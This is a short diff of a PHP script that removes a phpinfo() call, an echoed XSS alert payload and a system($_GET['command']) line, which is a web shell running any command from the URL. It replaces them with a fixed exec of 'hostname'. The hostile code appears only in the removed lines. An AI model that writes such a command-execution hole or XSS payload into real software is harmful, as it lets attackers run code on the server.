@@ -1,6 +1,7 @@
 <?php
-phpinfo();
-echo "<script>alert(XSS);</script>";
-echo "Run command: ".htmlspecialchars($_GET['command']);
-system($_GET['command']);
+$command = "hostname";
+$output = array();
+exec(hostname,$output);
+echo "<p><i>Command:</i> <nobr>$command</nobr></p>";
+echo '<pre>',print_r($output,true),'</pre>';
 ?>
